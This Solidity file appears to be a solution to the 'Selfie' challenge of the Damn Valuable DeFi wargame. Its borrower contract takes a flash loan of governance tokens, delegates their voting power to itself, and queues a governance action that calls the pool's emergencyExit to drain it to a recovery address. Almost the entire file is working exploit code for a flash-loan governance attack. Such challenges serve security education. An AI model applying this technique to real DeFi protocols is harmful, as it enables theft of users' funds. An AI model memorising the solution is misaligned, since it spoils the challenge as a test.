// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {console} from "forge-std/console.sol";

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract SelfieFlashLoanBorrower is IERC3156FlashBorrower {

    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    address immutable recovery;

    constructor(SelfiePool _pool, address _recovery) {
        pool = _pool;
        governance = SimpleGovernance(pool.governance());
        token = DamnValuableVotes(address(pool.token()));
        recovery = _recovery;
    }

    function onFlashLoan(
        address, // initiator
        address, // token
        uint256, // amount
        uint256, // fee
        bytes calldata // data
    ) external override returns (bytes32) {
        // Delegate voting power to this contract
        token.delegate(address(this));
        // Action to emergency exit
        bytes memory emergencyExitFunction = abi.encodeWithSelector(pool.emergencyExit.selector, recovery);
        // Queue action to drain the pool
        governance.queueAction(address(pool), 0, emergencyExitFunction);
        // Approve the pool to pull the flash loan back
        token.approve(address(pool), token.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan"); 
    }
}